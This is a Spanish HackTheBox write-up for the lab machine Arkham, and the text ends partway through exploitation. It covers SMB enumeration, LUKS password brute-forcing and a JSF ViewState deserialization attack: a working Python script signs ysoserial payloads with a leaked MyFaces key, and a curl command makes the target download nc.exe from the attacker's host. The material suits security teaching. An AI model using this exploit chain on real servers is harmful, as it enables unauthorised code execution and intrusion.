---
layout      : post
title       : "HackTheBox - Arkham"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179banner.png
category    : [ htb ]
tags        : [ deserialization, crypto, java, RPF, winrm ]
---
Máquina Windows nivel medio, deserializaremos **JavaServer Faces**, jugaremos con muchos payloads con la necesidad de firmarlos con una llave :O Haremos **Port Fortwarding**, leeremos correos y montaremos el directorio **raiz** del sistema (**C:**) en otro con todos los permisos para leer archivos.

![179arkhamHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179arkhamHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [MinatoTW](https://www.hackthebox.eu/profile/8308).

Buaaa, a jugar. Nos enfrentaremos a una deserialización insegura mediante el servicio **JavaServer Faces** y su campo **javax.faces.ViewState**, pero necesitaremos una llave para lograr encriptar nuestro payload, la llave la encontraremos enumerando el servicio **SMB** en un archivo **LUKS** encriptado, haremos fuerza bruta para encontrar la contraseña del objeto y finalmente obtener la llave para firmar el payload. Nos apoyaremos de **ysoserial** para generar varios payloads maliciosos y ejecutar comandos en el sistema, obtendremos una terminal como el usuario **Alfred**.

Estando dentro nos toparemos con un archivo **.zip** el cual contiene el backup del correo de **alfred**, dentro una imagen que nos muestra nuevas credenciales, en este caso del usuario **Batman**. Aprovecharemos que el servicio **WinRM** está siendo ejecutado internamente para entablarnos un **Reverse Port Fortwarding** y finalmente usar **evil-winrm**. Así obtendremos una **PowerShell** como **batman**.

Nos daremos cuenta de que estamos en el grupo **Administrators**, pero que no tenemos los permisos realmente. Podemos aprovechar la herramienta **net use** para montarnos el directorio **C:\\** en un disco cualquiera, así tendremos todos los archivos del sistema para jugar con ellos.

(Entiendo que debe haber otra forma en la que tengamos tooooooodos los permisos, pero aún sigo mirándolo).

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Poco jugueteo, queriendo ser real pero jmm :(

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

BUEEENO COMO ESSSS:

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Movimiento lateral **Alfred** -> **Batman**](#movimiento-lateral-alfred-batman).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Como siempre, validemos que servicios esta corriendo la máquina:

```bash
❭ nmap -p- --open -v 10.10.10.130 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                                                                                  |
| --open    | Solo los puertos que están abiertos                                                                      |
| -v        | Permite ver en consola lo que va encontrando                                                             |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
❭ cat initScan 
# Nmap 7.80 scan initiated Fri Apr 23 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.130
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.130 ()   Status: Up
Host: 10.10.10.130 ()   Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 8080/open/tcp//http-proxy///, 49666/open/tcp/////, 49667/open/tcp/////    Ignored State: filtered (65528)
# Nmap done at Fri Apr 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 404.77 seconds
```

Nos encontramos los puertos:

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)** |
| 135    | **[RPC](https://automai.force.com/help/s/article/how-to-configure-rpc-dynamic-port-allocation-to-work-with-firewalls)** |
| 139    | **[SMB](https://www.varonis.com/blog/smb-port/)** |
| 445    | **[SMB](https://www.varonis.com/blog/smb-port/)** |
| 8080   | **[HTTP Proxy](https://www.watchguard.com/help/docs/help-center/es-419/Content/es-419/fireware/proxies/http/http_proxy_about_c.html)** |
| 49666 - 49667 | Desconocidos |

Listo, ya tenemos los puertos abiertos, pero ahora juguemos a escanear scripts y versiones, asi obtendremos más info de cada uno:

**(Usamos la función referenciada antes**

```bash
❭ extractPorts initScan 
───────┬─────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.130
   5   │     [*] Open ports: 80,135,139,445,8080,49666,49667
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴─────────────────────────────────────────────────────────────
```

**)**

```bash
❭ nmap -p80,135,139,445,8080,49666,49667 -sC -sV 10.10.10.130 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
❭ cat portScan 
# Nmap 7.80 scan initiated Fri Apr 23 25:25:25 2021 as: nmap -p80,135,139,445,8080,49666,49667 -sC -sV -oN portScan 10.10.10.130
Nmap scan report for 10.10.10.130
Host is up (0.20s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Apache Tomcat 8.5.37
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Mask Inc.
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7m16s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-23T17:34:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 100.17 seconds
```

Obtenemos (varias cositas que veremos despues) por ahora:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP       | Microsoft IIS httpd 10        |
| 135    | RPC        | Microsoft Windows RPC         |
| 139    | SMB        | Microsoft Windows netbios-ssn |
| 445    | SMB        | (?) No sabemos                |
| 8080   | HTTP Proxy | Apache Tomcat 8.5.37          |
| 49666  | RPC        | Microsoft Windows RPC         |
| 49667  | RPC        | Microsoft Windows RPC         |

Bien, empecemos a divagar, perdámonos en cada puerto y veamos en cuál podremos renacer 😂

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![179page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179page80.png)

La ventana por default del servidor **Windows** I**nternet** I**nformation** S**ervices** (IIS), no hay nada en el código fuente y tampoco validando mediante fuzzing si había algo fuera de la vista... Así que por ahora movámonos a otro puerto.

...

### Puerto 135 (RPC) [⌖](#puerto-135) {#puerto-135}

> **MSRPC** (Microsoft Remote Procedure Call): Nos permite ejecutar procesos remotamente, pueden ser en otros sistemas o recursos compartidos en la red.

Podemos usar `rpcclient` para interactuar con el dominio, ya que nos permite acceder con credenciales nulas:

```bash
❭ rpcclient -U '' 10.10.10.130
Enter WORKGROUP\'s password: 
rpcclient $> enumdomusers 
result was NT_STATUS_CONNECTION_DISCONNECTED
```

o

```bash
❭ rpcclient -U '' 10.10.10.130 -N
rpcclient $> enumdomusers 
Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
```

Pero dando unas vueltas obtenemos siempre errores, así que por ahora tampoco podemos sacar mucho de acá, veamos los puertos SMB.

...

### Puerto 139-445 (SMB) [⌖](#puerto-139-445) {#puerto-139-445}

> **SAMBA**, en terminos generales nos permite compartir archivos (y varias cosas más) entre usuarios de una misma red.

* [Más info sobre los puertos **139** y **445** de SAMBA](https://www.varonis.com/blog/smb-port/).

Inicialmente podemos validar con `crackmapexec` la versión del sistema con el que estamos jugando:

```bash
❭ crackmapexec smb 10.10.10.130
SMB         10.10.10.130    445    ARKHAM           [*] Windows 10.0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)
```

Sistema operativo `Windows 10 Build 17763` :o

Ahora usemos `smbmap` para ver los recursos compartidos (en caso de existir y si nos deja verlos, claro esta):

```bash
❭ smbmap -H 10.10.10.130
[+] IP: 10.10.10.130:445        Name: unknown 
```

Indiquemosle un **null session**:

```bash
❭ smbmap -H 10.10.10.130 -u 'null'
[+] Guest session       IP: 10.10.10.130:445    Name: unknown
        Disk                            Permissions     Comment
        ----                            -----------     -------
        ADMIN$                          NO ACCESS       Remote Admin
        BatShare                        READ ONLY       Master Wayne's secrets
        C$                              NO ACCESS       Default share
        IPC$                            READ ONLY       Remote IPC
        Users                           READ ONLY
```

Perfe, podemos listar recursos compartidos y vemos dos objetos interesantes, **BatShare** (Master Wayne's secrets) y **Users**

### Descargando archivos - BatShare

Usemos `smbclient` para ver detalladamente que contienen:

```bash
❭ smbclient //10.10.10.130/BatShare -U ''
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb  3 08:00:10 2019
  ..                                  D        0  Sun Feb  3 08:00:10 2019
  appserver.zip                       A  4046695  Fri Feb  1 01:13:37 2019

                5158399 blocks of size 4096. 2128829 blocks available
smb: \>
```

Podemos descargarlo de vaaaaarias formas, veamos dos, primero desde el propio `smbclient` (por si quisiéramos descargar muuuchos archivos):

* [Download recursively a directory using **smbclient**](https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient/856640).

```bash
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \appserver.zip of size 4046695 as appserver.zip (436,2 KiloBytes/sec) (average 436,2 KiloBytes/sec)
smb: \>
```

```bash
❭ ls
appserver.zip
❭ file appserver.zip 
appserver.zip: Zip archive data, at least v2.0 to extract
```

Ahora con la herramienta `smbget` (Ponen un espacio en la contraseña):

```bash
❭ smbget -R smb://10.10.10.130/BatShare -U ''
Password for [] connecting to //BatShare/10.10.10.130: 
Using workgroup WORKGROUP, guest user
smb://10.10.10.130/BatShare/appserver.zip                                                                                                                                                       
Downloaded 3,86MB in 24 seconds
```

```bash
❭ file appserver.zip 
appserver.zip: Zip archive data, at least v2.0 to extract
```

Antes de seguir con el archivo `.zip`, validemos el otro recurso compartido.

### Descargando archivos - Users

De nuevo con `smbclient`:

```bash
❭ smbclient //10.10.10.130/Users -U ''
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sun Feb  3 08:24:10 2019
  ..                                 DR        0  Sun Feb  3 08:24:10 2019
  Default                           DHR        0  Thu Jan 31 21:49:06 2019
  desktop.ini                       AHS      174  Sat Sep 15 02:16:48 2018
  Guest                               D        0  Sun Feb  3 08:24:19 2019

                5158399 blocks of size 4096. 2126185 blocks available
smb: \>
```

Listo, toda la pinta del directorio `C:\Users\`, volvamos a repetir cualquiera de las dos formas para descargarnos los archivos:

```bash
❭ smbget -R smb://10.10.10.130/Users -U ''
Password for [] connecting to //Users/10.10.10.130: 
Using workgroup WORKGROUP, guest user
smb://10.10.10.130/Users/Default/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml
...
...
...
smb://10.10.10.130/Users/Guest/Videos/desktop.ini
Downloaded 34,76MB in 685 seconds
```

Uff, un montón de archivos (son varios, pero pues no voy a poner toda la lista) 😱

Bueno, ahora si descomprimamos el archivo `.zip`.

### Jugando con archivos - BatShare

Con `unzip` sale sencillito:

```bash
❭ unzip appserver.zip 
Archive:  appserver.zip
  inflating: IMPORTANT.txt
  inflating: backup.img
```

**IMPORTANT.txt**:

```bash
❭ cat IMPORTANT.txt 
Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce 
```

Jmm **Alfred**, se puso lindo esto :D

Tenemos dos usuarios (o tres) para guardar por si algo:

* **Alfred**.
* **Bruce**.
* **The Joker** (No creo, pero pues no se sabe).

Veamos la dichosa imagen que contiene el servidor Linux:

```bash
❭ file backup.img 
backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
```

Un archivo **LUKS** encriptado...

> **LUKS** (Linux Unified Key Setup-on-disk-format) es una implementación muy sencilla de utilizar para la gestión de particiones y unidades de almacenamiento cifradas en GNU/Linux. Se recomienda su uso en dispositivos móviles, computadoras portátiles y dispositivos de almacenamiento cuya información se desee proteger en caso de extravío o robo. [Cifrado de particiones con LUKS](https://www.alcancelibre.org/staticpages/index.php/ciframiento-particiones-luks).

Leyendo sobre como manejar esta imagen y de alguna forma ver su contenido, encontramos [este recurso](https://askubuntu.com/questions/835525/how-to-mount-luks-encrypted-file):

```bash
❭ cryptsetup open --type luks /htb/arkham/content/backup.img desire
Introduzca la frase contraseña de /htb/arkham/content/backup.img: 
No hay ninguna clave disponible con esa frase contraseña.
```

Nos pide una contraseña... Buscando sobre como podríamos crackear (o jugar con) el archivo encontramos varios recursos:

* [Brute forcing password cracking devices (LUKS)](https://dfir.science/2014/08/how-to-brute-forcing-password-cracking.html).
* [How to crack encrypted disk (crypto-LUKS) in an efficient way?](https://security.stackexchange.com/questions/128539/how-to-crack-encrypted-disk-crypto-luks-in-an-efficient-way).  
  * [Grond: The LUKS Password Cracker](https://www.incredigeek.com/home/projects/grond/).  
  * [**JUGAMOS PRINCIPALMENTE CON:** https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks).  

Pero si intentamos alguna forma de crackeo demora eternidades 😟 Podríamos pensar que quizás en el otro recurso compartido pueda estar alguna contraseña de algún usuario o algo parecido, pero la verdad es que no, (a menos que me haya fallado la vista y el tipeo) no encontramos nada :(

Acá estuve un tiempito recorriendo archivos y jugando con pensamiento lateral hasta que encontramos (creo) una relación entre el nombre de la carpeta compartida (**BatShare**) y una parte de la nota IMPORTANTE que tenía la imagen (**The Joker**). Si relacionamos los dos nombres podemos juntar a **Batman** y el **Joker**, probablemente sea algún tipo de "pista". Así que creémonos una wordlist que contenga todas las palabras relacionadas a esas dos (esta parte me costó pensarla):

```bash
❭ grep -iE "joker|batman" /usr/share/wordlists/rockyou.txt | wc -l
2961
❭ grep -iE "joker|batman" /usr/share/wordlists/rockyou.txt > batJok.txt
```

Ahora volvamos a intentar el bruteforce:

```bash
❭ bruteforce-luks -f batJok.txt -v 30 backup.img
```

Le pasamos el diccionario y la imagen para que vaya probando, ademas de indicarle que nos musetre cada 30 segundos en que posicion va:

```bash
❭ bruteforce-luks -f batJok.txt -v 30 backup.img
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
...
Tried passwords: 109
Tried passwords per second: 0,403704
Last tried password: batman02

Tried passwords: 121
Tried passwords per second: 0,403333
Last tried password: batman1234

Tried passwords: 129
Tried passwords per second: 0,403125
Last tried password: batmanforever

Password found: batmanforever
```

:o Encontramso una posible password, pues intentemos ahora abrir el archivo:

* [Mount LUKS encrypted file](https://askubuntu.com/questions/835525/how-to-mount-luks-encrypted-file).

```bash
❭ cryptsetup open --type luks $(pwd)/backup.img desire
Introduzca la frase contraseña de /htb/arkham/content/SMB/BatShare/backup.img:
```

No obtenemos ningun error, validemos:

```bash
❭ ls -la /dev/mapper/
total 0
drwxr-xr-x  2 root root      80 abr 25 14:28 .
drwxr-xr-x 18 root root    3400 abr 25 14:28 ..
crw-------  1 root root 10, 236 abr 25 14:28 control
lrwxrwxrwx  1 root root       7 abr 25 14:28 desire -> ../dm-0
```

Y ahora lo montamos:

```bash
❭ ls -la /mnt
total 16
drwxr-xr-x 1 root root   0 abr 28  2020 .
drwxr-xr-x 1 root root 300 ene 26 10:52 .
❭ mount /dev/mapper/desire /mnt
· ※ /home/jntx/sec/htb/arkham/content/SMB/BatShare ·
❭ ls -la /mnt
total 30
drwxr-xr-x 4 root root  1024 dic 25  2018 .
drwxr-xr-x 1 root root   300 ene 26 10:52 ..
drwx------ 2 root root 12288 dic 25  2018 lost+found
drwxrwxr-x 4 root root  1024 dic 25  2018 Mask
```

Ahora veamos que hay en los directorios:

```bash
❭ tree
.
├── lost+found
└── Mask
    ├── docs
    │   └── Batman-Begins.pdf
    ├── joker.png
    ├── me.jpg
    ├── mycar.jpg
    ├── robin.jpeg
    └── tomcat-stuff
        ├── context.xml
        ├── faces-config.xml
        ├── jaspic-providers.xml
        ├── MANIFEST.MF
        ├── server.xml
        ├── tomcat-users.xml
        ├── web.xml
        └── web.xml.bak

4 directories, 13 files
```

Lo interesante lo tenemos en el directorio `Mask/tomcat-stuff/`, de primeras podríamos ir directamente al archivo `tomcat-users.xml` que a veces contienen credenciales de usuarios tomcat, pero esta vez no hay nada útil...

Para trabajar un poco más rápido, copiamos la carpeta `Mask/` al equipo y la desmontamos del sistema:

```bash
❭ umount /mnt
```

Visitando los archivos de *tomcat**, vemos otro llamativo a la vista, `web.xml.bak`, pero no podemos hacer nada con él ni con los otros, así que 😐

...

### Puerto 8080 (Proxy) [⌖](#puerto-8080) {#puerto-8080}

![179page8080](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179page8080.png)

Opa, un servicio web con info, el único recurso funcional es `Subscription` que nos redirecciona a:

![179page8080_subscription](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179page8080_subscription.png)

A primera vista no hay nada interesante, pero si nos vamos al código fuente tenemos:

```html
...
<form id="j_id_jsp_1623871077_1" name="j_id_jsp_1623871077_1" method="post" action="/userSubscribe.faces" enctype="application/x-www-form-urlencoded">
  <table>
    <tbody>
      <tr>
        <td>
          <input id="j_id_jsp_1623871077_1:email" name="j_id_jsp_1623871077_1:email" type="text" value="" style="margin-left:50px;" class="button" />
        </td>
      </tr>
    </tbody>
  </table>
  <input id="j_id_jsp_1623871077_1:submit" name="j_id_jsp_1623871077_1:submit" type="submit" value="SIGN UP" style="cursor: pointer" class="button" />
  <input type="hidden" name="j_id_jsp_1623871077_1_SUBMIT" value="1" />
  <input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=" />
</form>
...
```

Tenemos campos escondidos y uno que juega con el componente `javax.faces`... Pues buscando en internet sobre él, tenemos que es un framework de **Java** (JavaServer Faces) usado para generar aplicaciones basadas en interfaces de usuario (UI).

* [Introducción a **JavaServer Faces**](http://www.jtech.ua.es/j2ee/publico/jsf-2012-13/sesion01-apuntes.html).
* [JavaServer Faces - Wikipedia](https://en.wikipedia.org/wiki/Jakarta_Server_Faces).

Bien, el campo juguetón es medio extraño, indagando sobre **javax.faces exploit** encontramos recursos interesantes:

* [How i found a 1500$ worth Deserialization vulnerability](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a).
* [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html).
* [Java JSF ViewState (.faces) Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization).

Y si, efectivamente, varios recursos hablando sobre vulnerabilidades de deserializacion (que tanto me gustan), así que definamos rápidamente que es eso de "deserializacion":

> En pocas palabras (pocas realmente, hechenle un ojo por su parte, es super interesante). La [deserializacion](https://www.glosarioit.com/Deserializaci%C3%B3n) es convertir un conjunto de bytes que viajan por la red a un unico objeto. (La serializacion seria lo contrario).

Sencillito no?

El problema surge cuando no están bien configurados los servicios o no se valida el contenido de lo que viaja al crear un objeto, lo que nos permite aprovecharnos del proceso, ya que mientras se genera el objeto podemos inyectar cositas en la mitad. Lo más probable es que el proceso nos dé un error (ya que estamos modificando el objeto por lo tanto su estructura) pero no nos interesara, porque el proceso fallo precisamente después de haber leído nuestras instrucciones inyectadas, por lo tanto si todo va bien, las habrá ejecutado ;)

(Es un lindo tema)

* [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).
* [Insecure deserialization](https://portswigger.net/web-security/deserialization).
* [Serialization and deserialization in Java](https://snyk.io/blog/serialization-and-deserialization-in-java/).

...

## Explotación [#](#explotacion) {#explotacion}

Listo, indagando específicamente en los recursos encontrados sobre **javax.faces exploit** hablan del campo `javax.faces.ViewState` que se encarga de guardar el estado actual de la sesión, por ejemplo para indicarle al servidor que partes de la web deberíamos ver. El campo puede ser manejado desde el **servidor** y el **cliente** y es enviado de vuelta una vez el formulario (en nuestro caso) sea generado.

Por lo general se implementan en dos procesos:

* Oracle Mojarra (JSF reference implementation).
* Apache MyFaces.

Bien, si seguimos indagando vemos que el campo contiene data serializada :O Opa, empieza a tomar sentido...

Ahora, vimos que se puede implementar en dos procesos, nos enfocaremos en el segundo, **Apache MyFaces**. Pero ¿por qué? Vale, recordemos el archivo `web.xml.bak`, en los artículos referencian un campo del archivo llamado `javax.faces.STATE_SAVING_METHOD` el cual puede tener o **server** o **client** (lo que hablamos antes):

```bash
❭ cat web.xml.bak | grep SAVING -A 1
<param-name>javax.faces.STATE_SAVING_METHOD</param-name>
<param-value>server</param-value>
```

Como en nuestro caso tenemos **server** y en las referencias indican que para tener un vector de ataque satisfactorio debemos contar con:

> Campo **ViewState** [desencriptado](https://www.codeproject.com/Articles/150688/How-to-Make-ViewState-Secure-in-ASP-NET) (por lo que si hacemos un `base64 -d` deberiamos ver un formato Java).
> In case of **Mojarra**: ViewState configured to reside on the **client**.
> In case of **MyFaces**: ViewState configured to reside on the **client** or the **server**.

Por lo tanto descartamos a **Mojarra** :)

...

* [ViewState - Apache MyFaces](https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization#apache-myfaces).

Entonces, veamos que contiene la cadena en **base64**:

```bash
❭ echo "wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=" | base64 -d
z4b#-F!e)x8~r\LE
                S.IB9aH;ҁ^gOTfeL
```

Y pues no :P Asi que podemos entender que esta encriptado :(

Peeeeeeeeeeeeeeeeeeero, sabemos que contamos (presuntamente) con una vulnerabilidad de deserializacion ante ese campo, yyyyyyyyyyy si volvemos al archivo `web.xml.bak` vemos otra cadena en **base64** pero hacienod referencia a un secreto y cositas de encriptacion:

```xml
<param-name>org.apache.myfaces.SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
    <context-param>
        <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
        <param-value>HmacSHA1</param-value>
     </context-param>
<context-param>
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
...
```

```bash
❭ echo "SnNGOTg3Ni0=" | base64 -d
JsF9876-
```

Parece insignificante, pero si volvemos al artículo al final hay un script que usa una llave (curiosamente la misma) para convertir payloads normalitos y feitos a payloads firmados con la llave :)

Pues nada, ahora nos queda crear los payloads, nos podemos apoyar de [ysoserial](https://github.com/frohoff/ysoserial) que ayuda a generar payloads que explotan vulnerabilidades de deserialización en **Java**:

Descargamos el binario y ejecutamos para ver todos los tipos de payload que podemos usar:

![179bash_ysoserial_payloads](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_ysoserial_payloads.png)

Uff varios, lo mejor será crear un script para generar los payloads y que al mismo tiempo haga las peticiones web hacia el campo "vulnerable" a ver si logramos explotar alguna deserializacion... Extraemos el nombre de cada payload para generar un array después:

```bash
❭ curl -s https://github.com/frohoff/ysoserial | grep Payload -A 35 | awk '{print $1}' | tail -n 34 > payloadsYSO
# O tambien asi:
❭ wget https://github.com/frohoff/ysoserial
❭ cat ysoserial | grep Payload -A 35 | awk '{print $1}' | tail -n 34 > payloadsYSO
```

Ya tendríamos los payloads, démosle el formato de array:

```bash
❭ for i in $(cat payloadsYSO); do echo -n "'$i',"; done
'AspectJWeaver','BeanShell1','C3P0','Click1','Clojure','CommonsBeanutils1','CommonsCollections1','CommonsCollections2','CommonsCollections3','CommonsCollections4','CommonsCollections5','CommonsCollections6','CommonsCollections7','FileUpload1','Groovy1','Hibernate1','Hibernate2','JBossInterceptors1','JRMPClient','JRMPListener','JSON1','JavassistWeld1','Jdk7u21','Jython1','MozillaRhino1','MozillaRhino2','Myfaces1','Myfaces2','ROME','Spring1','Spring2','URLDNS','Vaadin1','Wicket1',
```

Listo, ahora si los tenemos, después de un rato probando cositas creamos este script:

```py
#!/usr/bin/python3

import hashlib, hmac
import requests
import base64
import time
import os
from pyDes import *

payloads = [
    'AspectJWeaver','BeanShell1','C3P0','Click1','Clojure','CommonsBeanutils1','CommonsCollections1','CommonsCollections2','CommonsCollections3',
    'CommonsCollections4','CommonsCollections5','CommonsCollections6','CommonsCollections7','FileUpload1','Groovy1','Hibernate1','Hibernate2',
    'JBossInterceptors1','JRMPClient','JRMPListener','JSON1','JavassistWeld1','Jdk7u21','Jython1','MozillaRhino1','MozillaRhino2','Myfaces1',
    'Myfaces2','ROME','Spring1','Spring2','URLDNS','Vaadin1','Wicket1'
]

# Firmamos el payload
# * https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization#custom-encryption
def encrypt(payload,key):
    cipher = des(key, ECB, IV=None, pad=None, padmode=PAD_PKCS5)
    enc_payload = cipher.encrypt(payload)
    return enc_payload

def hmac_siga(enc_payload,key):
    hmac_sig = hmac.new(key, enc_payload, hashlib.sha1)
    hmac_sig = hmac_sig.digest()
    return hmac_sig

url = "http://10.10.10.130:8080"
key = b'JsF9876-'

def sign_payload(cmd):
    '''
    Ejecutar comandos en el sistema y jugar con el output
    * https://python-para-impacientes.blogspot.com/2014/02/ejecutar-un-comando-externo.html
    '''
    for payload in payloads:
        print("Enviando " + payload)

        # Generamos payload
        # https://stackoverflow.com/questions/42339876/error-unicodedecodeerror-utf-8-codec-cant-decode-byte-0xff-in-position-0-in
        os.system('java -jar ysoserial.jar %s "%s" > %s.txt' % (payload, cmd, payload))
        payload_file = open('./' + payload + '.txt', 'rb')

        # Firmamos payload
        enc_payload = encrypt(payload_file.read(),key)
        hmac_sig = hmac_siga(enc_payload,key)

        # Pasamos a base64
        final_payload = base64.b64encode(enc_payload + hmac_sig)

        payload_file.close()

        data_post = {
            "j_id_jsp_1623871077_1:email" : "aaaaaaaaa", 
            "j_id_jsp_1623871077_1:submit" : "SIGN UP",
            "j_id_jsp_1623871077_1_SUBMIT" : "1",
            "javax.faces.ViewState" : final_payload
        }

        session = requests.Session()
        r = session.post(url + '/userSubscribe.faces', data=data_post)

        # Borramos los archivos creados de cada payload (por un problema tuve que hacerlo asi).
        os.system("shred -zun 10 %s.txt" % (payload))

# Enviamos el comando
sign_payload("ping -n 1 10.10.14.14")
```

Entonces generamos el payload, que dentro de él va a tener el comando `ping -n 1 10.10.14.14`, por lo tanto si se ejecuta deberíamos recibir una petición **ICMP** hacia nuestra máquina. Pongámonos en escucha para ver que llega hacia el protocolo **ICMP** en la red:

```bash
❭ tshark -i tun0 -Y "icmp" 2>/dev/null
```

Hagamos un ejemplo rápido de lo que hace el script:

<span>1. </span>Generamos payload.

```bash
❭ java -jar ysoserial.jar Click1 'ping -n 1 10.10.14.14' > clickpayload.txt
❭ strings clickpayload.txt
java.util.PriorityQueue
sizeL
...
❭ file clickpayload.txt 
clickpayload.txt: Java serialization data, version 5
```

<span>2. </span>Firmamos el payload.

<span>3. </span>Convertimos el payload a base64 para pasárselo al campo **ViewState**.

```bash
❭ cat clickpayload.txt | base64 | tr -d '\n'
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4Kx...
```

<span>4. </span>Enviamos la petición :P

...

Listo, pues ejecutando el script y estando atentos tenemos respuesta cuando llega a estos payloads:

```py
❭ python3 validatePayload.py
...
Enviando CommonsCollections5
Enviando CommonsCollections6
Enviando CommonsCollections7
...
```

![179bash_tshark_pingDONE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_tshark_pingDONE.png)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179google_gif_hypeoverload.gif" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Bien, pues borrando la mayoría de payloads y quedándonos con los cercanos a estos tres podemos validar realmente que tenemos ejecución de comandos remotamenteeeeeeeeeeeeeeeeeeeeeee :D

Listoooooooo, generemos una Reverse Shell. Pongámonos en escucha con netcat, `nc -lvp 4433`.

Intentando con **PowerShell** (y sus variaciones), con **certutil** y finalmente con **cURL** subir el binario `nc.exe`, logramos con este último recibir las 3 peticiones en nuestro servidor web:

```py
...
sign_payload("curl http://10.10.14.14:8000/nc.exe -o C:\\Windows\\Temp\\nc.exe'")
```

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
